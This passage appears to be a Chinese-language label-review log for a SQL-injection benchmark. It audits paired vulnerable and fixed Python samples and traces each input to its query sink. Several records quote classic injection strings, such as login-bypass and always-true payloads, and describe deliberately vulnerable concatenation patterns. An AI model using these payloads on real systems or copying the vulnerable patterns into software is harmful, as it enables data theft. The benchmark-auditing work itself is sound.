+输入来源：同族 SRC-SQLI-11-V 的 /export/<table>。
+输入经过的处理过程：第 11 行 if table not in EXPORTABLE: abort(404)，EXPORTABLE 是常量集合。
+最终输出位置或危险操作：同一 FROM {table} 拼接，但 table 只能取集合内固定值。
+已有防护及其适用范围：标识符白名单；集合内的字符串都是常量，不含 SQL 片段。
+判断理由：表名受限于 {sales, refunds, inventory}，用户无法注入；这是标识符场景的正确修法。
+原标签 safe 成立；业务上非白名单表返回 404，属合理收紧。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-12-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：4f60aeb83c3447804ddce11560fe29aa24687f136cb9c1c1cd3e6e9683156a24
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12-15 行（anchor 位于第 13 行）
+
+主审结论：agree
+
+输入来源：PATCH /users/<int:user_id> 的 JSON 体（changes 的全部键值）。
+输入经过的处理过程：第 12 行遍历 changes.items()；第 13 行把键和值都拼进
+f"{column} = '{value}'" 形成 SET 子句；第 15 行 WHERE id = ? 只绑定 user_id，SET 子句整体是拼接。
+最终输出位置或危险操作：第 15 行 UPDATE 语句的 SET 部分（列名与值均为用户控制）。
+已有防护及其适用范围：user_id 用了参数绑定，但只覆盖 WHERE；SET 的列名与值没有白名单、没有绑定。
+
+判断理由：两条注入路径：(1) value 含单引号可闭合字面量并追加 SQL；
+(2) column 可写成 "display_name = 'x', email = (SELECT ...)" 改变 SET 结构。
+"部分用了绑定"不代表其余拼接安全。lines=[12,15]、anchor 在 13 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12-15 行（拼接在 12-13，执行在 15）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-12-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：0d43945ee13c9373ebc388f81a9a568f04fac0509860aa0534fa8dbb219fee5a
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-12-V 的 JSON 体。
+输入经过的处理过程：EDITABLE 常量元组限定列；第 13 行拒绝空列或含未知键的请求（400）；
+第 15 行只对白名单列生成 "column = ?"，第 17 行把各值与 user_id 一起绑定。
+最终输出位置或危险操作：同一 UPDATE，但列名来自常量、值全部绑定。
+已有防护及其适用范围：列名白名单 + 值参数绑定，两者同时覆盖 V 的两条注入路径。
+
+判断理由：列名只能取 display_name/email/timezone，值只作为参数，SQL 结构不可变。原标签 safe 成立。
+业务上拒绝未知字段（400）并保留合法字段更新，符合"不编造白名单、不静默丢弃"的要求。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-13-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：1c6c8c073a2012117f1e3b7e19ac8b7bd3f42487e90d32e37d0638ab3c9fcfb8
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 13 行（anchor 位于第 13 行）
+
+主审结论：agree
+
+输入来源：POST /guests 的表单字段 event（names 为重复字段 name）。
+输入经过的处理过程：第 12 行把 event 用 % 拼进模板 SQL："INSERT ... VALUES (?, '%s')" % event；
+第 13 行 executemany 只对第一个 ? 绑定 names，event 已成为 SQL 文本的一部分。
+最终输出位置或危险操作：第 13 行 executemany 执行的 INSERT。
+已有防护及其适用范围：部分绑定：name 是安全的，event 不是；绑定只覆盖了占位符，不影响格式化进去的文本。
+
+判断理由：event 含单引号可闭合字面量，插入额外列/子查询或改变 VALUES 结构；这是"一半绑定一半拼接"
+的典型漏洞。lines=[13,13]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 13 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-13-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：9bf12868f649a3a64f4d797adf71e07d1486290d0396f5882950e62f1cc7bfc3
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-13-V 的 event 与 names。
+输入经过的处理过程：第 13 行模板改为 "VALUES (?, ?)"，第 13 行把 (n, event) 作为参数序列交给 executemany。
+最终输出位置或危险操作：同一 INSERT，SQL 文本固定。
+已有防护及其适用范围：两个值都绑定；executemany 的参数序列逐行传入，不改变 SQL 结构。
+
+判断理由：event 与 name 都只作为数据；即使含引号也不能改变语句。原标签 safe 成立，业务上插入语义不变。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-14-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：cb417cdd172d52b651547a575dc0ceaa728c3c073196a35ec817327d9b921d5c
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：请求头 X-Tenant（request.headers.get("X-Tenant", "")）。
+输入经过的处理过程：第 11 行 f-string 直接把 header 值嵌进单引号字符串：
+f"SELECT title FROM reports WHERE tenant = '{...}'"，第 11 行末 execute 执行。
+最终输出位置或危险操作：第 11 行 cursor.execute 的 WHERE 子句。
+已有防护及其适用范围：无。自定义请求头与查询参数一样可控，f-string 不做任何转义。
+
+判断理由：X-Tenant = "' OR 1=1 --" 可恒真取全部租户；"O'Reilly" 也会导致语法错误，
+说明该值确实进入 SQL 文本。lines=[11,11]、anchor 一致，标签成立。
+附注：该 f-string 在表达式内使用同种引号，依赖 Python 3.12+ 的 PEP 701；项目基线 3.13，语法有效。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 11 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-14-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：ea448b5488fecb53c2b4f9734bd93d3fe3276d5e39cdfa2314b973a46d168e76
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-14-V 的 X-Tenant 请求头。
+输入经过的处理过程：第 11 行 SQL 改为 "... WHERE tenant = ?"，header 值作为参数元组传入。
+最终输出位置或危险操作：同一 WHERE 条件，值绑定。
+已有防护及其适用范围：qmark 参数绑定，覆盖该唯一用户输入。
+
+判断理由：header 值只作为数据，O'Reilly 能正常匹配，注入串只当普通文本。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-15-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：a5b083ca2bfc0dd213150360d122649eea2e4654ebc992bc51f305a44b875cef
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12-14 行（anchor 位于第 14 行）
+
+主审结论：agree
+
+输入来源：GET /articles 的查询参数 author。
+输入经过的处理过程：视图第 20 行把 request.args.get("author","") 传给 ArticleRepository.by_author；
+第 14 行在类方法内用 "..." + author + "'" 拼接并 execute。
+最终输出位置或危险操作：第 14 行 cursor.execute 的 WHERE author = '...'。
+已有防护及其适用范围：无。类方法封装不改变拼接性质，helper/方法边界不提供任何转义。
+
+判断理由：author 含单引号可闭合字面量，追加 OR 1=1 或 UNION；调用链把 request 数据原样送入 sink。
+lines=[12,14] 覆盖方法定义到执行，anchor 在 14 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12-14 行（拼接与执行都在第 14 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-15-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：6ce9aa1804444f017c8aeba91798793489df7f177ee9572dac25601435a6ff83
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-15-V 的 author 参数。
+输入经过的处理过程：第 14 行 SQL 改为 "... author = ?"，author 作为参数元组传入。
+最终输出位置或危险操作：同一 WHERE 条件，参数绑定。
+已有防护及其适用范围：方法内部的 qmark 绑定，覆盖进入 sink 的唯一值。
+
+判断理由：author 只作为数据，含引号也能正确匹配/拒绝；类封装不影响绑定。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-16-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：0a690ad373f99b4f68d0ec2528958e30ac53e39ec5c95c31be061809545d0dd3
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12-13 行（anchor 位于第 13 行）
+
+主审结论：agree
+
+输入来源：session["uid"] → 数据库 users.username（二阶来源）；username 在注册/改名等未展示的写入路径中
+可能由用户控制。
+输入经过的处理过程：第 12 行用参数绑定按 uid 取 username；第 13 行把 username f-string 拼进
+"SELECT id,total FROM orders WHERE customer = '{username}'" 后直接 execute。
+最终输出位置或危险操作：第 13 行 db.execute 的 WHERE 条件。
+已有防护及其适用范围：第一跳（uid）用了绑定；第二跳（username → SQL）没有绑定，也没有转义。
+第一跳的安全不能传递到第二跳。
+
+判断理由：这是典型的二阶 SQL 注入：存储值在后续查询中被当作 SQL 文本。若用户可写 username
+（如注册接口允许任意用户名），即可在读取订单时注入。lines=[12,13]、anchor 在 13 行，
+标签与位置成立。样例未展示写入路径，因此可利用性依赖外部接口，但 sink 本身确实不安全。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12-13 行（拼接与执行都在第 13 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：样例内没有 username 的写入路径；建议在 catalog 中明确"二阶"前提（该字段已注明
+input_source=database_value，故不构成标签分歧）
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-16-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：ea2273084bcffeefb7bebd088a9841b009e0e65ef445980de7cb2b22e88ed83c
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-16-V 的 username（来自数据库）。
+输入经过的处理过程：第 13 行 SQL 改为 "... customer = ?"，username 作为参数传入。
+最终输出位置或危险操作：同一 WHERE 条件，参数绑定。
+已有防护及其适用范围：二阶值同样走参数绑定；绑定不区分数据来源是一阶还是二阶。
+
+判断理由：即使 username 含引号或 SQL 片段，也只作为数据比较；第一跳的绑定与第二跳的绑定都正确。
+原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-17-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：a478524ce7e26b631d9f1422ae5d1b6ac4292b03f950698083144acebbe6220d
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 13-14 行（anchor 位于第 14 行）
+
+主审结论：agree
+
+输入来源：GET /feed 的查询参数 limit、offset。
+输入经过的处理过程：第 13 行 limit/offset 以 %s 格式化进
+"SELECT ... ORDER BY id DESC LIMIT %s OFFSET %s"；第 14 行 execute(sql)。
+最终输出位置或危险操作：第 14 行 db.execute 的 LIMIT/OFFSET 表达式。
+已有防护及其适用范围：无。LIMIT/OFFSET 虽然常被当作"数字参数"，但 SQLite 接受表达式，
+没有 int 校验就不是数字。
+
+判断理由：limit="1+1" 返回 2 行；limit 也可写成子查询表达式（SQLite 允许 LIMIT (SELECT ...)），
+从而读取其它数据或制造布尔/时间侧信道。用户输入改变了语句的表达式结构，属 SQL 注入。
+lines=[13,14]、anchor 在 14 行，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 13-14 行（拼接在 13，执行在 14）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-17-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：a8d96b6af3b5683a84f6b03f81a0a6c8845235d7a49f0cf170b911886455e370
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-17-V 的 limit、offset。
+输入经过的处理过程：第 10-11 行 int() 解析，limit 再 min(max(...,1),100)，offset 做 max(...,0) 下限；
+第 13 行 SQL 改为 "LIMIT ? OFFSET ?"，第 14 行执行并绑定。
+最终输出位置或危险操作：同一 LIMIT/OFFSET，类型与范围都受限。
+已有防护及其适用范围：int 类型校验 + 数值夹取 + 参数绑定，三层都覆盖；非法值抛 ValueError（500），
+不会回退成默认值。
+
+判断理由：输入只能是整数，且 limit 被限制在 1..100、offset 非负；绑定进一步保证 SQL 结构不变。
+原标签 safe 成立；非法数值明确报错而非静默使用默认值，符合修复要求。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-18-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：b26c2be902daf6359ca8e33b769bbbb750d80b2b01739d839d13b2d915b1d126
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：Cookie region（request.cookies.get("region", "eu")）。
+输入经过的处理过程：第 11 行 db.execute("SELECT name FROM items WHERE region = '{}'".format(cookie))，
+str.format 把 cookie 原样嵌入单引号字面量。
+最终输出位置或危险操作：第 11 行 execute 的 WHERE 条件。
+已有防护及其适用范围：无。Cookie 是客户端可控输入，format 不做任何转义。
+
+判断理由：region 含单引号可闭合并追加 OR/UNION；与查询参数一样构成注入。lines=[11,11]、
+anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 11 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-18-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：688903852da68b98b87f55d3148fed89e994522354fb26de456c628181dbac88
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-18-V 的 Cookie region。
+输入经过的处理过程：第 11 行 SQL 改为 "... region = ?"，cookie 值作为参数元组传入。
+最终输出位置或危险操作：同一 WHERE 条件，绑定执行。
+已有防护及其适用范围：qmark 绑定覆盖该输入；Cookie 与参数走同一绑定路径。
+
+判断理由：region 只作为数据，引号/UNION 不会改变 SQL 结构。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-19-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：3d1e6f864c36496823628b03f95d50b7134b985833a993792df27dc5f520bb0a
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12-16 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：GET /jobs 的查询参数 city、level。
+输入经过的处理过程：第 12 行 sql += " AND city = '" + city + "'"；第 14 行对 level 做同样的 +=；
+两分支都可能执行，最后第 16 行 execute(sql)。
+最终输出位置或危险操作：第 16 行 db.execute 的动态 WHERE 子句。
+已有防护及其适用范围：无。sql 从常量开始，但后续 += 把用户值拼进去；"初始字符串安全"不代表
+追加后仍安全。
+
+判断理由：city="' OR 1=1 --" 可让 WHERE 恒真；两个分支都可注入，且 level 可单独触发。
+lines=[12,16] 覆盖两个分支与执行，anchor 在 12 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12-16 行（city 分支 12，level 分支 14，执行 16）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-19-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：f72bfa0a70efa9a9ebf41d2b7d63b50cf712277481b5402255f960bf7813b0b3
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-19-V 的 city、level。
+输入经过的处理过程：第 10 行 sql, params = "... WHERE 1 = 1", []；每个分支只追加 " AND city = ?"
+或 " AND level = ?" 并把值 append 到 params；第 18 行 execute(sql, params)。
+最终输出位置或危险操作：同一动态 WHERE，但 SQL 片段是常量，值走参数列表。
+已有防护及其适用范围：参数列表累积 + 固定占位符；分支是否执行都不会把用户文本拼进 SQL。
+
+判断理由：两个可选过滤器共用同一个参数列表，顺序与占位符一致；用户值只作为数据。
+原标签 safe 成立，且分支业务（只传 city）仍可用。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-20-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：65a9fcf178cde1020ba96a0929a6ef4b8d553d6525052cc909529f8c825d2ca8
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 10-16 行（anchor 位于第 10 行）
+
+主审结论：agree
+
+输入来源：POST /leads/count 的 JSON 字段 status。
+输入经过的处理过程：第 16 行 request.get_json(force=True)["status"] 传给 helper count_leads；
+第 10 行 helper 内 text("SELECT COUNT(*) FROM leads WHERE status = '" + status + "'") 后
+session.execute(...).scalar()。
+最终输出位置或危险操作：第 10 行 SQLAlchemy Session.execute 执行的 raw text。
+已有防护及其适用范围：无。text() 只表示"这是原始 SQL"，不会自动绑定；拼接在进入 text() 之前完成。
+
+判断理由：status 含单引号可闭合并注入子查询/UNION；SQLAlchemy ORM 会话不会为 raw text 做转义。
+lines=[10,16] 覆盖 helper 与调用，anchor 在 10 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 10-16 行（拼接与执行在第 10 行，来源在 16）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-20-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：db6d4f624f6eab9e8885834370376002caa8b4c2411879be009b94f396864904
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-20-V 的 JSON 字段 status。
+输入经过的处理过程：第 10 行 text("... WHERE status = :status") 加 {"status": status} 绑定参数。
+最终输出位置或危险操作：同一 Session.execute，但值走命名绑定。
+已有防护及其适用范围：SQLAlchemy text() 的命名参数绑定，覆盖该唯一输入；文本中不含用户数据。
+
+判断理由：status 只作为绑定值，SQL 文本固定；O'Reilly 等值能正常计数，注入串只当普通文本。
+原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+====================================================================
+四、开发集 SQL 注入源码（samples/dev/source/sqli.bundle.txt，8 族 16 条）
+====================================================================
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-01-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：f0bb45ddd2ecae777ac74d2e4f3c15a5e3f9ad7f74da6a92986360a049f2527e
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：GET /user 的查询参数 name。
+输入经过的处理过程：第 10 行取 name；第 12 行 f-string 直接嵌入单引号字面量
+"SELECT id, email FROM users WHERE name = '{name}'" 并 execute。
+最终输出位置或危险操作：第 12 行 db.execute 的 WHERE 条件。
+已有防护及其适用范围：无。f-string 是字符串插值，不是参数绑定。
+
+判断理由：name="' OR 1=1 --" 可闭合并恒真；name 中的 UNION 也可拼接结果集。属基础 SQL 注入。
+lines=[12,12]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-01-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：dc8cc3e4bd18759a25fb3ea7d68df9a72dc5aa38510f0871cfabd70e62951039
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-01-V 的 GET /user 参数 name。
+输入经过的处理过程：第 12 行 SQL 改为 "... name = ?"，name 作为参数元组传入。
+最终输出位置或危险操作：同一 WHERE 条件，值绑定。
+已有防护及其适用范围：sqlite3 qmark 绑定；SQL 文本不含用户数据。
+
+判断理由：name 只作为数据比较，注入串不会改变结构。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-02-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：5f01c6e0619775f11144ddf9377649f78a379514e18009bd6b8ff04a8ef9cdaf
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 14-15 行（anchor 位于第 15 行）
+
+主审结论：agree
+
+输入来源：POST /login 的表单字段 username、password。
+输入经过的处理过程：第 10-11 行读取两个字段；第 14 行用 + 拼成
+"SELECT id FROM users WHERE username = '" + username + "' AND pw_hash = '" + password + "'"；
+第 15 行 cur.execute(sql)。
+最终输出位置或危险操作：第 15 行 cursor.execute。
+已有防护及其适用范围：无。两个字段都可注入，任一字段即可绕过登录条件。
+
+判断理由：username="admin'--" 可截断密码条件；password="' OR '1'='1" 可恒真。
+这是登录处经典注入。lines=[14,15]、anchor 在 15 行，标签与位置成立。
+附带问题（不属于本次注入标签）：把明文 password 与 pw_hash 直接比较，认证设计本身可疑，
+应单列为业务/安全问题，不影响 CWE-89 判定。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 14-15 行（拼接在 14，执行在 15）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-02-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：b4594e3980373717dc5711d10c24efeab46092c71c45b2374d7882ef30f83575
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-02-V 的 username、password。
+输入经过的处理过程：第 14 行 SQL 改为两个 ? 占位符；第 15 行 execute(sql, (username, password))。
+最终输出位置或危险操作：同一登录查询，两个值绑定。
+已有防护及其适用范围：两个字段都绑定，没有任何一个留在 SQL 文本里。
+
+判断理由：两个输入都只作为数据，无法改变 WHERE 结构；原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：安全对照仍未解决明文/哈希比较问题；这是认证设计问题，不是注入问题
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-03-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：8f6a166fff946a2d7b495b22665b5cb367b781eaf0768e87f960d36743111b74
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：GET /orders 的查询参数 customer。
+输入经过的处理过程：第 12 行 cur.execute("... WHERE customer = '%s'" % customer) —— Python 的 %
+运算符先把 customer 代入 SQL 文本，再交给驱动。
+最终输出位置或危险操作：第 12 行 cursor.execute 的 WHERE 条件。
+已有防护及其适用范围：无。此处的 "%s" 是 Python 字符串格式符，不是数据库占位符；Python % 在驱动前
+就完成了替换，驱动看不到参数。
+
+判断理由：customer 含单引号可闭合字面量并注入。该样例是"看起来像参数化"的硬负例：
